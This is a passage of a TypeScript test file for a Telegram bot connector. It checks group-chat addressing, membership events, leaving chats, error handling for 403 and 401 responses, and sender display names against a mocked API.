    await instance.stop();
  });
});

describe("group chats on the seam", () => {
  /** A started bot `@fixture_bot` (id 1) whose `getUpdates` returns one batch; `answer` overrides what a method returns. */
  async function started(
    updates: readonly unknown[],
    answer: (method: string, body: Record<string, unknown>) => unknown = () => ({
      ok: true,
      result: { message_id: 77, date: 0, chat: { id: 7 } },
    }),
  ) {
    const calls: { method: string; body: Record<string, unknown> }[] = [];
    let polled = false;
    const fetchImpl = vi.fn(async (url: string, init?: RequestInit) => {
      const method = url.split("/").pop() ?? "";
      if (method === "getMe") return jsonResponse({ ok: true, result: { id: 1, username: "Fixture_Bot" } });
      if (method === "getUpdates") {
        if (!polled) {
          polled = true;
          return jsonResponse({ ok: true, result: updates });
        }
        return hangUntilAborted(init?.signal ?? undefined);
      }
      const body = JSON.parse(String(init?.body)) as Record<string, unknown>;
      calls.push({ method, body });
      return jsonResponse(answer(method, body));
    });
    const instance = createTelegramConnectorDefinition({
      fetch: fetchImpl as unknown as typeof fetch,
      pollErrorBackoffMs: 1,
    }).createConnection({ connection: connectionFixture(), config: {}, credentials: tokenCredentials("test-token") });
    const received: InboundEvent[] = [];
    instance.onInboundEvent?.(async (event) => {
      received.push(event);
    });
    await instance.start();
    return { instance, calls, received };
  }
  const group = { id: -100, type: "supergroup" };

  it("declares groups: what it reports, its policy, its host and that removal purges", () => {
    expect(createTelegramConnectorDefinition().capabilities.groups).toEqual({
      addressing: ["mention", "reply", "command"],
      directToSender: true,
      listRooms: false,
      membershipEvents: true,
      leaveRoom: true,
    });
    expect(TELEGRAM_CHANNEL_DESCRIPTOR).toMatchObject({
      groups: { unboundSenders: "hold", unlistedRooms: "drop", defaultTrigger: ["mention", "reply", "command"] },
      hosts: ["api.telegram.org"],
      retention: "purge-on-remove",
    });
    // A private chat's id is its user's: the direct destination a `direct` event's conversation is.
    expect(createTelegramConnectorDefinition().directDestinationOf?.("9", connectionFixture())).toEqual({ chatId: "9" });
  });

  it("reports addressed on a mention by username, a text_mention by id and a reply to the bot, and takes a leading mention off the text", async () => {
    const { instance, received } = await started([
      {
        update_id: 1,
        message: {
          message_id: 1,
          date: 0,
          text: "@fixture_bot what's on today?",
          entities: [{ type: "mention", offset: 0, length: 12 }],
          chat: group,
          from: { id: 9 },
        },
      },
      {
        update_id: 2,
        message: {
          message_id: 2,
          date: 0,
          text: "ask Tavi about it",
          entities: [{ type: "text_mention", offset: 4, length: 4, user: { id: 1 } }],
          chat: group,
          from: { id: 9 },
        },
      },
      {
        update_id: 3,
        message: {
          message_id: 3,
          date: 0,
          text: "yes please",
          reply_to_message: { message_id: 77, from: { id: 1 } },
          chat: group,
          from: { id: 9 },
        },
      },
      // Another bot named, a reply to someone else, and plain talk: not addressed.
      {
        update_id: 4,
        message: {
          message_id: 4,
          date: 0,
          text: "@other_bot hi",
          entities: [{ type: "mention", offset: 0, length: 10 }],
          chat: group,
          from: { id: 9 },
        },
      },
      {
        update_id: 5,
        message: {
          message_id: 5,
          date: 0,
          text: "agreed",
          reply_to_message: { message_id: 3, from: { id: 9 } },
          chat: group,
          from: { id: 8 },
        },
      },
      { update_id: 6, message: { message_id: 6, date: 0, text: "just chatting", chat: group, from: { id: 8, is_bot: true } } },
      {
        update_id: 7,
        message: {
          message_id: 7,
          date: 0,
          caption: "@FIXTURE_BOT",
          caption_entities: [{ type: "mention", offset: 0, length: 12 }],
          photo: [{ file_id: "p" }],
          chat: group,
          from: { id: 9 },
        },
      },
    ]);
    await vi.waitFor(() => expect(received).toHaveLength(7));
    expect(received.map((event) => event.addressed)).toEqual([
      ["mention"],
      ["mention"],
      ["reply"],
      undefined,
      undefined,
      undefined,
      ["mention"],
    ]);
    expect(received.map((event) => event.content)).toEqual([
      "what's on today?",
      "ask Tavi about it",
      "yes please",
      "@other_bot hi",
      "agreed",
      "just chatting",
      undefined,
    ]);
    expect(received.map((event) => event.authorKind)).toEqual(["person", "person", "person", "person", "person", "bot", "person"]);
    await instance.stop();
  });

  it("reports a leading command for this bot, or for no bot, as addressed, and takes the bot's name off it", async () => {
    const { instance, received } = await started([
      {
        update_id: 1,
        message: {
          message_id: 1,
          date: 0,
          text: "/ask@fixture_bot what's on?",
          entities: [{ type: "bot_command", offset: 0, length: 16 }],
          chat: group,
          from: { id: 9 },
        },
      },
      {
        update_id: 2,
        message: {
          message_id: 2,
          date: 0,
          text: "/new",
          entities: [{ type: "bot_command", offset: 0, length: 4 }],
          chat: group,
          from: { id: 9 },
        },
      },
      // Another bot's command, and one not at the start: not addressed.
      {
        update_id: 3,
        message: {
          message_id: 3,
          date: 0,
          text: "/ask@other_bot hi",
          entities: [{ type: "bot_command", offset: 0, length: 14 }],
          chat: group,
          from: { id: 9 },
        },
      },
      {
        update_id: 4,
        message: {
          message_id: 4,
          date: 0,
          text: "try /ask",
          entities: [{ type: "bot_command", offset: 4, length: 4 }],
          chat: group,
          from: { id: 9 },
        },
      },
    ]);
    await vi.waitFor(() => expect(received).toHaveLength(4));
    expect(received.map((event) => event.addressed)).toEqual([["command"], ["command"], undefined, undefined]);
    expect(received.map((event) => event.content)).toEqual(["/ask what's on?", "/new", "/ask@other_bot hi", "try /ask"]);
    await instance.stop();
  });

  it("reports the bot added to and removed from a group, and nothing for a private chat's block", async () => {
    const member = (status: string, was: string, chat: Record<string, unknown> = { ...group, title: "Team" }) => ({
      chat,
      from: { id: 9 },
      date: 1_700_000_000,
      old_chat_member: { status: was, user: { id: 1 } },
      new_chat_member: { status, user: { id: 1 } },
    });
    const { instance, received } = await started([
      { update_id: 1, my_chat_member: member("member", "left") },
      { update_id: 2, my_chat_member: member("administrator", "member") },
      { update_id: 3, my_chat_member: member("kicked", "administrator") },
      { update_id: 4, my_chat_member: member("kicked", "member", { id: 9, type: "private" }) },
      // Restricted but not a member: still out, so nothing changed.
      {
        update_id: 6,
        my_chat_member: { ...member("restricted", "left"), new_chat_member: { status: "restricted", is_member: false, user: { id: 1 } } },
      },
      { update_id: 5, message: { message_id: 8, date: 0, text: "after", chat: group, from: { id: 9 } } },
    ]);
    await vi.waitFor(() => expect(received).toHaveLength(3));
    expect(received.slice(0, 2)).toMatchObject([
      {
        kind: "membership",
        externalSenderId: "9",
        externalConversationId: "-100",
        conversationKind: "group",
        membership: { change: "added", roomName: "Team" },
      },
      { kind: "membership", membership: { change: "removed" } },
    ]);
    expect(received[0]?.providerEventId).not.toBe(received[1]?.providerEventId);
    await instance.stop();
  });

  it("leaves a group with leaveChat", async () => {
    const { instance, calls } = await started([]);
    await instance.leaveRoom?.({ chatId: "-100" });
    expect(calls).toContainEqual({ method: "leaveChat", body: { chat_id: "-100" } });
    await instance.stop();
  });

  it("marks a send to a user who never started the bot, or blocked it, unreachable; another 403 is only rejected", async () => {
    const { instance } = await started([], (_method, body) => {
      if (body["chat_id"] === "9")
        return { ok: false, error_code: 403, description: "Forbidden: bot can't initiate conversation with a user" };
      if (body["chat_id"] === "10") return { ok: false, error_code: 403, description: "Forbidden: bot was blocked by the user" };
      return { ok: false, error_code: 403, description: "Forbidden: bot is not a member of the supergroup chat" };
    });
    const send = (chatId: string) =>
      instance.send({ effectId: `e-${chatId}`, connectionId: "conn-1", destination: { chatId }, parts: [{ content: "hi" }] });
    expect((await send("9")).parts[0]).toMatchObject({ status: "rejected", unreachable: true });
    expect((await send("10")).parts[0]).toMatchObject({ status: "rejected", unreachable: true });
    expect((await send("-100")).parts[0]).not.toHaveProperty("unreachable");
    await instance.stop();
  });

  it("names a refused token's repair: a 401 at start, and on a poll while running", async () => {
    const refusing = vi.fn(async () => jsonResponse({ ok: false, error_code: 401, description: "Unauthorized" }));
    const instance = createTelegramConnectorDefinition({ fetch: refusing as unknown as typeof fetch }).createConnection({
      connection: connectionFixture(),
      config: {},
      credentials: tokenCredentials("test-token"),
    });
    await expect(instance.start()).rejects.toMatchObject({ details: { repair: "credentials" } });
    expect(instance.status()).toMatchObject({ state: "failed", repair: "credentials" });

    let polls = 0;
    const revokedLater = vi.fn(async (url: string, init?: RequestInit) => {
      if (url.endsWith("/getMe")) return jsonResponse({ ok: true, result: { id: 1 } });
      polls += 1;
      if (polls === 1) return jsonResponse({ ok: false, error_code: 401, description: "Unauthorized" });
      // A network error after the refusal does not clear its repair.
      if (polls === 2) throw new TypeError("fetch failed");
      return hangUntilAborted(init?.signal ?? undefined);
    });
    const running = createTelegramConnectorDefinition({
      fetch: revokedLater as unknown as typeof fetch,
      pollErrorBackoffMs: 1,
    }).createConnection({ connection: connectionFixture(), config: {}, credentials: tokenCredentials("test-token") });
    await running.start();
    await vi.waitFor(() => expect(polls).toBe(3));
    // Still failed, with its repair, after the backoff: a refused token does not recover on its own.
    expect(running.status()).toMatchObject({ state: "failed", repair: "credentials" });
    await running.stop();
  });

  it("records the sender's Telegram display name and @username on inbound messages when present", async () => {
    const { instance, received } = await started([
      {
        update_id: 1,
        message: {
          message_id: 70,
          date: 0,
          text: "/start ABCD-EFGH",
          entities: [{ type: "bot_command", offset: 0, length: 6 }],
          chat: { id: 9, type: "private" },
          from: { id: 9, first_name: "Ana", last_name: "Smith", username: "ana_tg" },
        },
      },
      {
        update_id: 2,
        message: {
          message_id: 71,
          date: 0,
          text: "/link ABCD-EFGH",
          chat: { id: 10, type: "private" },
          from: { id: 10, username: "bo_only" },
        },
      },
    ]);
    await vi.waitFor(() => expect(received).toHaveLength(2));
    expect(received[0]).toMatchObject({
      externalSenderId: "9",
      senderName: "Ana Smith (@ana_tg)",
      content: "/start ABCD-EFGH",
    });
    expect(received[1]).toMatchObject({
      externalSenderId: "10",
      senderName: "@bo_only",
      content: "/link ABCD-EFGH",
    });
    await instance.stop();
  });

  it("keeps the (@username) suffix intact when a sender's full name and handle exceed 80 characters", async () => {
    const { instance, received } = await started([
      {
        update_id: 1,
        message: {
          message_id: 72,
          date: 0,
          text: "hello",
          chat: { id: 9, type: "private" },
          from: { id: 9, first_name: "A".repeat(60), last_name: "B".repeat(20), username: "long_user" },
        },
      },
    ]);
    await vi.waitFor(() => expect(received).toHaveLength(1));
    expect(received[0]?.senderName?.length).toBeLessThanOrEqual(80);
    expect(received[0]?.senderName?.endsWith("(@long_user)")).toBe(true);
    await instance.stop();
  });
});
